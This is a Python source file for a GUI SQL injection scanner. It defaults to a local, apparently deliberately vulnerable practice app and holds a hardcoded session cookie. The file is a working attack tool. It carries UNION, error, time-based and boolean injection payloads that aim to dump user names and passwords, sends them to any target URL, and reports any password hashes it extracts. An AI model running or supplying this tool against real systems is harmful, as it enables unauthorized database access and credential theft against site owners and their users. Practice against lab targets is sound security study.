import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import requests
from bs4 import BeautifulSoup
import time
import threading
import re

class SQLiScannerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("SQL Injection Scanner")
        self.root.geometry("800x600")
        
        # Initialize variables
        self.scanning = False
        self.payloads = [
            "1' UNION SELECT user, password FROM users-- ",
            "1' UNION SELECT CONCAT(user, ':', password), NULL FROM users-- ",
            "1' AND 1=CONVERT(int, (SELECT user))-- ",
            "1' OR EXISTS(SELECT * FROM users WHERE user LIKE '%admin%')-- ",
            "1' AND SLEEP(5)-- ",
            "1' OR '1'='1"
        ]
        
        # Create GUI components
        self.create_widgets()
        
    def create_widgets(self):
        # Top frame for inputs
        top_frame = ttk.Frame(self.root)
        top_frame.pack(pady=10, padx=10, fill="x")
        
        # Target URL
        ttk.Label(top_frame, text="Target URL:").grid(row=0, column=0, sticky="w")
        self.url_entry = ttk.Entry(top_frame, width=60)
        self.url_entry.grid(row=0, column=1, padx=5, pady=2)
        self.url_entry.insert(0, "http://localhost:42001/vulnerabilities/sqli/")
        
        # Parameters
        ttk.Label(top_frame, text="Parameters:").grid(row=1, column=0, sticky="w")
        self.param_entry = ttk.Entry(top_frame, width=60)
        self.param_entry.grid(row=1, column=1, padx=5, pady=2)
        self.param_entry.insert(0, "id")
        
        # Session cookie
        ttk.Label(top_frame, text="PHPSESSID:").grid(row=2, column=0, sticky="w")
        self.cookie_entry = ttk.Entry(top_frame, width=60)
        self.cookie_entry.grid(row=2, column=1, padx=5, pady=2)
        self.cookie_entry.insert(0, "9pabjkthu3nmm3u6nsri2uk5pk")
        
        # Scan log
        self.log = scrolledtext.ScrolledText(self.root, wrap=tk.WORD)
        self.log.pack(pady=10, padx=10, fill="both", expand=True)
        
        # Button panel
        button_frame = ttk.Frame(self.root)
        button_frame.pack(pady=10)
        
        self.start_btn = ttk.Button(button_frame, text="Start Scan", command=self.start_scan)
        self.start_btn.pack(side="left", padx=5)
        
        self.stop_btn = ttk.Button(button_frame, text="Stop Scan", command=self.stop_scan, state="disabled")
        self.stop_btn.pack(side="left", padx=5)
        
        self.clear_btn = ttk.Button(button_frame, text="Clear Log", command=self.clear_log)
        self.clear_btn.pack(side="left", padx=5)
        
    def start_scan(self):
        if not self.validate_inputs():
            return
            
        self.scanning = True
        self.toggle_buttons(False)
        self.clear_log()
        
        scan_thread = threading.Thread(target=self.run_scan)
        scan_thread.start()
        
    def stop_scan(self):
        self.scanning = False
        self.toggle_buttons(True)
        self.log_message("\nScan stopped by user", "info")
        
    def clear_log(self):
        self.log.delete(1.0, tk.END)
        
    def log_message(self, message, tag=None):
        self.log.insert(tk.END, message + "\n", tag)
        self.log.see(tk.END)
        
    def toggle_buttons(self, state):
        self.start_btn.config(state="enabled" if state else "disabled")
        self.stop_btn.config(state="enabled" if not state else "disabled")
        
    def validate_inputs(self):
        if not self.url_entry.get().startswith("http"):
            messagebox.showerror("Error", "Invalid URL format")
            return False
        if not self.param_entry.get():
            messagebox.showerror("Error", "Parameters required")
            return False
        return True
        
    def run_scan(self):
        target_url = self.url_entry.get()
        parameters = [p.strip() for p in self.param_entry.get().split(",")]
        phpsessid = self.cookie_entry.get()
        
        headers = {
            "Cookie": f"PHPSESSID={phpsessid}; security=low",
            "User-Agent": "SQLiScanner/1.0"
        }
        
        try:
            # Get baseline response
            normal_response = requests.get(
                target_url,
                params={parameters[0]: "1"},
                headers=headers,
                timeout=5
            ).text
            soup_normal = BeautifulSoup(normal_response, "html.parser")
            normal_text = soup_normal.get_text().lower()
        except Exception as e:
            self.log_message(f"❌ Initial connection failed: {str(e)}", "error")
            self.stop_scan()
            return
            
        for param in parameters:
            for payload in self.payloads:
                if not self.scanning:
                    break
                
                try:
                    full_url = f"{target_url}?{param}={payload}&Submit=Submit"
                    start_time = time.time()
                    
                    response = requests.get(
                        target_url,
                        params={param: payload, "Submit": "Submit"},
                        headers=headers,
                        timeout=10
                    )
                    response_time = time.time() - start_time
                    
                    # Analyze response
                    self.analyze_response(
                        response.text,
                        normal_text,
                        response_time,
                        param,
                        payload
                    )
                    
                    time.sleep(0.5)
                    
                except Exception as e:
                    self.log_message(f"⚠️ Error testing {payload}: {str(e)}", "error")
        
        if self.scanning:
            self.log_message("\n✅ Scan completed successfully", "info")
            self.stop_scan()
        
    def analyze_response(self, response_text, normal_text, response_time, param, payload):
        soup = BeautifulSoup(response_text, "html.parser")
        test_text = soup.get_text().lower()
        
        # Error-based detection
        error_patterns = [
            "unclosed quotation",
            "syntax error",
            "unrecognized keyword",
            "type mismatch"
        ]
        if any(pattern in test_text for pattern in error_patterns):
            self.log_message(f"[ERROR] {param} with {payload}", "error")
            
        # Time-based detection
        if response_time >= 5:
            self.log_message(f"[TIME] {param} with {payload} ({response_time:.2f}s)", "time")
            
        # Boolean-based detection
        md5_pattern = re.compile(r"[0-9a-f]{32}")
        password_found = "password" in test_text and "password" not in normal_text
        hash_found = bool(md5_pattern.search(test_text))
        
        if password_found or hash_found:
            self.log_message(f"[BOOLEAN] {param} with {payload}", "boolean")
            if hash_found:
                self.log_message(f"   Found hash: {md5_pattern.search(test_text).group()}", "boolean")

if __name__ == "__main__":
    root = tk.Tk()
    app = SQLiScannerGUI(root)
    
    # Configure text colors
    app.log.tag_config("error", foreground="red")
    app.log.tag_config("time", foreground="orange")
    app.log.tag_config("boolean", foreground="green")
    app.log.tag_config("info", foreground="blue")
    
    root.mainloop()